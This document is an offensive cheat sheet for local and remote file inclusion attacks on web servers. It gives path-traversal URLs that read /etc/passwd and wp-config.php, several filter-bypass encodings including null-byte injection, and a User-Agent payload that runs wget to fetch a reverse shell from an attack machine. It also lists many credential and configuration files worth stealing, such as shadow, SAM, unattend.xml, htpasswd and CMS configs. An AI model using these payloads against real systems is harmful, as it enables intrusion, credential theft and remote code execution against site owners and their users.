# Local and Remote File Inclusion (LFI/RFI)

*Local file inclusion (LFI):* Allow an attacker to read local files on the web server using malicious web requests.

- Web configuration files

- Log files

- Passwords files

- Other sensitive system files

*LFI* can also be used for remote code execution (RCE).

*Remote file inclusions:* Allow an attacker to use the web server's ability to call local files, and using it to upload files from remote servers. 

# Test

To test for LFI:

`http://host/?page=../../../../../etc/passwd`

### wget

Not the most common approach but it may work if the other methods doesn't work.

`wget http://[host]/wp-content/uploads/page.php?url=../../../../../../../var/www/html/wp-config.php`

### Bypass Traversal

If the application is attempting to sanitize user input by removing traversal sequences, try different combination:

`....//`

`....\/`

`..../\`

`....\\`

### URL-encoded

Encoding all the slashes and dots in your path traversal could bypass input filters:

**dot = %2e**

**forward slash = %2f**

**backslash = %5c**

**Example:**

 `%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd`

### Double URL-encoded

Another encoding method:

**dot = %252e**

**forward slash = %252f**

**backslash = %255c**

**Example:**

`%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`

### Overlong UTF-8 encoding

You can also use the illegal Unicode payload type in Burp Intruder for this technique:

**dot = %c0%2e  %e0%40%ae  %c0ae etc.**

**forward slash = %c0%af  %e0%80%af  %c0%2f etc.**

**backslash = %c0%5c  %c0%80%5c  etc.**

### Null-byte injection

Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else. A null byte terminator (%00 or 0x00 in hex) added to the LFI/RFI parameter will stop processing immediately, so that any bytes following it are ignored.

In the following code example, the extension .php added to the file request variable $file:

`$file = $_GET['page'];
require_once("/var/www/$file.php");`

Requesting `/etc/passwd` in this case will not work because the request becomes passwd.php resulting in a 404 error. However, if we add a null byte to the passwd file name it will terminate at the end of passwd and discard the remaining bytes:

`http://website/page=../../../etc/passwd%00`

### proc/self/environ method

If you're able to request /proc/self/environ using LFI, you might be able to get a shell by downloading a remote file with reverse shellcode and run it on the system (e.g. php reverse shell). You'll need to intercept the /proc/self/environ request and replace HTTP request header User Agent with the following:

`<?system('wget http://[attack machine]/reverseshell.txt -O shell.php');?>`

Then execute the shell by calling the URL where it was uploaded:

`http://[host]/folder/shell.php`

## Linux

### Systems files

- /etc/passwd

- /etc/shadow

- /etc/issue

- /etc/group

- /etc/hostname

### Log files

- Apache access log: /var/log/apache/access.log

- Apache access log: /var/log/apache2/access.log

- Apache access log: /var/log/httpd/access_log

- Apache error log: /var/log/apache/error.log

- Apache error log: /var/log/apache2/error.log

- Apache error log: /var/log/httpd/error_log

- General messages and system related entries: /var/log/messages

- Cron logs: /var/log/cron.log

- Authentication logs: /var/log/secure or /var/log/auth.log

## Windows

### To verify LFI on Windows systems:

- C:/windows/System32/drivers/etc/hosts

### Windows systems files which may contain passwords and other sensitive information:

- C:/Windows/Panther/Unattend/Unattended.xml

- C:/Windows/Panther/Unattended.xml _**(may contain credentials for privilege account, good for privesc)**_

- C:/Windows/Panther/Unattend.txt

- C:/Unattend.xml  

- C:/Autounattend.xml

- C:/Windows/system32/sysprep

- C:\WINDOWS\system32\eula.txt

- C:\boot.ini

- C:\WINDOWS\win.ini

- C:\WINNT\win.ini  

- C:\WINDOWS\Repair\SAM 

- C:\WINDOWS\php.ini  

- C:\WINNT\php.ini  

- C:\Program Files\Apache Group\Apache\conf\httpd.conf 

- C:\Program Files\Apache Group\Apache2\conf\httpd.conf  

- C:\Program Files\xampp\apache\conf\httpd.conf  

- C:\php\php.ini 

- C:\php5\php.ini  

- C:\php4\php.ini  

- C:\apache\php\php.ini  

- C:\xampp\apache\bin\php.ini  

- C:\home2\bin\stable\apache\php.ini 

- C:\home\bin\stable\apache\php.ini

### Interesting files is the web root directory:

- C:/inetpub/wwwroot/

- C:/inetpub/wwwroot/web.config

- C:/inetpub/logs/logfiles/

### Other interesting files (not always available)

- C:/documents and settings/administrator/desktop/desktop.ini

- C:/documents and settings/administrator/ntuser.dat

- C:/documents and settings/administrator/ntuser.ini

- C:/users/administrator/desktop/desktop.ini

- C:/users/administrator/ntuser.dat

- C:/users/administrator/ntuser.ini

- C:/windows/windowsupdate.log

### XAMPP on Windows

- C:/xampp/apache/conf/httpd.conf

- C:/xampp/security/webdav.htpasswd

- C:/xampp/apache/logs/access.log

- C:/xampp/apache/logs/error.log

- C:/xampp/tomcat/conf/tomcat-users.xml

- C:/xampp/tomcat/conf/web.xml

- C:/xampp/webalizer/webalizer.conf

- C:/xampp/webdav/webdav.txt

- C:/xampp/apache/bin/php.ini

- C:/xampp/apache/conf/httpd.conf

### SYSTEMROOT is usually windows

- Windows\repair\SAM

- %SYSTEMROOT%\repair\SAM

- %SYSTEMROOT%\System32\config\RegBack\SAM

- %SYSTEMROOT%\System32\config\SAM

- %SYSTEMROOT%\repair\system

- %SYSTEMROOT%\System32\config\SYSTEM

- %SYSTEMROOT%\System32\config\RegBack\system

## Popular CMS configuration files

### WordPress: 

- /var/www/html/wp-config.php

### Joomla: 

- /var/www/configuration.php

### Dolphin CMS: 

- /var/www/html/inc/header.inc.php

### Drupal: 

- /var/www/html/sites/default/settings.php

### Mambo: 

- /var/www/configuration.php

### PHPNuke: 

- /var/www/config.php

### PHPbb: 

- /var/www/config.php
